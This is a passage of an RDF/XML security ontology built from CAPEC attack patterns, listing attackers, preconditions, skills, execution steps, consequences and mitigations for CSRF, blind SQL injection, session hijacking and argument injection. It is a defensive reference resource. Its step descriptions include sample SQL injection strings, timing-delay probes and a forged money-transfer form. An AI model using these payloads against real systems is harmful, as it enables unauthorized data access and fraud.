        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::384::664::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Forge the session credential and reply the request.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Attackers may require tools to craft messages containing their forged credentials  and ability to send HTTP request to a web application.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker101">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#240">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Resource Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack101">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#240"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::99::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::99::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application allows the user to both specify the identifier used to access a system resource. Through this permission  the user gains the capability to perform actions on that resource (e.g.  overwrite the file)::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker100">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#155"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack100"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::377::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must utilize temporary files and must fail to adequately secure them against other parties reading them.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Because some application may have a large number of temporary files and/or these temporary files may be very large  an adversary may need tools that help them quickly search these files for sensitive information. If the adversary can simply copy the files to another location and if the speed of the search is not important  the adversary can still perform the attack without any special resources.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker499">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#41">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:242::NATURE:ChildOf:CAPEC ID:134::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Using Meta-characters in E-mail Headers to Inject Malicious Payloads"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack499">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#41"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::150::88::697::713::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:(Identify and characterize metacharacter-processing vulnerabilities in email headers) An attacker creates emails with headers containing various metacharacter-based malicious payloads in order to determine whether the target application processes the malicious content and in what manner it does so.TECHNIQUE:Use an automated tool (fuzzer) to create malicious emails headers containing metacharacter-based payloads.:TECHNIQUE:Manually tampering email headers to inject malicious metacharacter-based payload content in them.::STEP:2:PHASE:Exploit:DESCRIPTION:An attacker leverages vulnerabilities identified during the Experiment Phase to inject malicious email headers and cause the targeted email application to exhibit behavior outside of its expected constraints.TECHNIQUE:Send emails with specifically-constructed  metacharacter-based malicious payloads in the email headers to targeted systems running email processing applications identified as vulnerable during the Experiment Phase.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::150::88::697::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This attack targets most widely deployed feature rich email applications  including web based email programs.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To distribute email:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker233">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#62">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:21::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cross Site Request Forgery"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack233">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#62"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::352::306::664::732::716::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Explore target website) The attacker first explores the target website to determine pieces of functionality that are of interest to him (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.TECHNIQUE:Use web application debugging tool such as WebScarab  Tamper Data or TamperIE to analyze the information exchanged between the client and the server:TECHNIQUE:Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server:TECHNIQUE:View HTML source of web pages that contain links or buttons that perform actions of interest.::STEP:2:PHASE:Experiment:DESCRIPTION:(Create a link that when clicked on  will execute the interesting functionality.) The attacker needs to create a link that will execute some interesting functionality such as transfer money  change a password  etc.TECHNIQUE:Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amp;amt=10000):TECHNIQUE:Create a form that will submit a POST request (e.g. &lt;form method=POST action=https://www.somebank.com/members/transfer.asp&gt;&lt;input type=hidden Name=to value=012345678901/&gt;&lt;input type=hidden Name=amt value=10000/&gt;&lt;input type=submit src=clickhere.jpg/&gt;&lt;/form&gt;::STEP:3:PHASE:Exploit:DESCRIPTION:(Convince user to click on link) Finally  the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.TECHNIQUE:Execute a phishing attack and send the user an e-mail convincing him to click on a link.:TECHNIQUE:Execute a stored XSS attack on a website to permanently embed the malicious link into the website.:TECHNIQUE:Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.:TECHNIQUE:Include the malicious link on the attackers&apos; own website where the user may have to click on the link  or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::352::306::664::732::716::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs to figure out the exact invocation of the targeted malicious action and then craft a link that performs the said action. Having the user click on such a link is often accomplished by sending an email or posting such a link to a bulletin board or the likes.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker366">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#7">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:66::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Blind SQL Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack366">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#7"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::89::209::74::20::697::713::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Hypothesize SQL queries in application)Generated hypotheses regarding the SQL queries in an application. For example  the adversary may hypothesize that his input is passed directly into a query that looks like: SELECT * FROM orders WHERE ordernum = _____orSELECT * FROM orders WHERE ordernum IN (_____)orSELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____ Of course  there are many other possibilities.TECHNIQUE:Research types of SQL queries and determine which ones could be used at various places in an application.::STEP:2:PHASE:Explore:DESCRIPTION:(Determine how to inject information into the queries)Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example  the following are possible injections for those queries: 5&apos; OR 1=1; --and5) OR 1=1; --andordernum DESC; --TECHNIQUE:Add clauses to the SQL queries such that the query logic does not change.:TECHNIQUE:Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY &apos;0:0:10&apos; in SQL Server or BENCHMARK(1000000000 MD5(1) in MySQL). If these can be injected into the queries  then the length of time that the server takes to respond reveals whether the query is injectable or not.::STEP:3:PHASE:Experiment:DESCRIPTION:(Determine user-controllable input susceptible to injection) Determine the user-controllable input susceptible to injection. For each user-controllable input that the adversary suspects is vulnerable to SQL injection  attempt to inject the values determined in the previous step. If an error does not occur  then the adversary knows that the SQL injection was successful.TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data  TamperIE  WebScarab etc. to modify HTTP POST parameters  hidden fields  non-freeform fields  etc.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:4:PHASE:Experiment:DESCRIPTION:(Determine database type) Determines the type of the database  such as MS SQL Server or Oracle or MySQL  using logical conditions as part of the injected queriesTECHNIQUE:Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only):TECHNIQUE:Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only):TECHNIQUE:Inject other database-specific commands into input fields susceptible to SQL Injection. The adversary can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the adversary received a normal response from the server or not).::STEP:5:PHASE:Exploit:DESCRIPTION:(Extract information about database schema) Extract information about database schema by getting the database to answer yes/no questions about the schema.TECHNIQUE:Automatically extract database schema using a tool such as Absinthe.:TECHNIQUE:Manually perform the blind SQL Injection to extract desired information about the database schema.::STEP:6:PHASE:Exploit:DESCRIPTION:(Exploit SQL Injection vulnerability) Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify  add  retrieve or delete data from the databaseTECHNIQUE:Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables  inserting records  etc.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::89::209::74::20::697::713::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::SQL queries used by the application to store  retrieve or modify data.::User-controllable input that is not properly validated by the application as part of SQL queries.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Determining the database type and version  as well as the right number and type of parameters to the query being injected in the absence of error messages requires greater skill than reverse-engineering database error messages.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker70">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#309"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack70"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Probing requires the ability to interactively send and receive data from a target  whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker232">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#6">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:137::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Argument Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack232">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#6"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::74::146::184::78::185::713::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Discovery of potential injection vectors) Using an automated tool or manual discovery  the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS  API  SQL procedures  etc.).TECHNIQUE:Manually cover the application and record the possible places where arguments could be passed into external systems.:TECHNIQUE:Use a spider  for web applications  to create a list of URLs and associated inputs.::STEP:2:PHASE:Experiment:DESCRIPTION:(1. Attempt variations on argument content) Possibly using an automated tool  the attacker will perform injection variations of the arguments.TECHNIQUE:Use a very large list of probe strings in order to detect if there is a positive result  and  what type of system has been targeted (if obscure).:TECHNIQUE:Use a proxy tool to record results  error messages and/or log if accessible.::STEP:3:PHASE:Exploit:DESCRIPTION:(Abuse of the application) The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.TECHNIQUE:Manually inject specific payload into targeted argument.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::74::146::184::78::185::713::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.::Software must allow for unvalidated or unfiltered input to be executed on operating system shell  and  optionally  the system configuration must allow for output to be sent back to client.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker has to identify injection vector  identify the operating system-specific commands  and optionally collect the output.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to communicate synchronously or asynchronously with server. Optionally  ability to capture output directly through synchronous communication or other method such as FTP.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker365">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#626"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack365"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must have physical access to the device.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker must know how to make use of these smudges.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker498">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#593">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:21::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Session Hijacking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack498">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#593"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::287::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Integrity Availability Gain Privileges A successful attack can enable an adversary to gain unauthorized access to an application.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::287::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application that leverages sessions to perform authentication.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Exploiting a poorly protected identity token is a well understood attack with many helpful resources available.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must have the ability to communicate with the application over the network.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8  UTF-16  etc.)::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack126">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#267">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:153::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Leverage Alternate Encoding"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::173::172::180::181::171::73::21::74::20::697::692::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application for user-controllable inputs) Using a browser  an automated tool or by inspecting the application  an attacker records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe entry points to locate vulnerabilities) The attacker uses the entry points gathered in the Explore phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Try to use different encodings of content in order to bypass validation routines.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption Denial of Service::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Minimize switch and option functionality to only that necessary for correct function of the command.::Implementation: Remove all debug and testing options from production code.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack227"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker231">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#472">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:541::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Browser Fingerprinting"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack231">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#472"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Victim&apos;s browser visits a website that contains attacker&apos;s Java ScriptJava Script is not disabled in the victim&apos;s browser::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker364">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#21">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Exploitation of Trusted Credentials"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack364">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#21"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::290::302::346::539::6::384::664::602::642::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application for Indicators of Susceptibility) Using a variety of methods  until one is found that applies to the target system. the attacker probes for credentials  session tokens  or entry points that bypass credentials altogether.TECHNIQUE:Spider all available pages:TECHNIQUE:Attack known bad interfaces::STEP:2:PHASE:Experiment:DESCRIPTION:(Fetch samples) An attacker fetches many samples of a session ID. This may be through legitimate access (logging in  legitimate connections  etc) or just systematic probing.TECHNIQUE:An attacker makes many anonymous connections and records the session IDs assigned.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials issued.:TECHNIQUE:An attacker gains access to (legitimately or illegitimately) a nearby system (e.g.  in the same operations network  DMZ  or local network) and makes a connections from it  attempting to gain the same privileges as a trusted system.::STEP:3:PHASE:Exploit:DESCRIPTION:(Impersonate) An attacker can use successful experiments to impersonate an authorized user or system::STEP:4:PHASE:Exploit:DESCRIPTION:(Spoofing) Bad data can be injected into the system by an attacker.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::290::302::346::539::6::384::664::602::642::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Server software must rely on weak session IDs proof and/or verification schemes::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To achieve a direct connection with the weak or non-existent server session access control  and pose as an authorized user:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to deploy software on network. Ability to communicate synchronously or asynchronously with server::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker497">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#14"/>
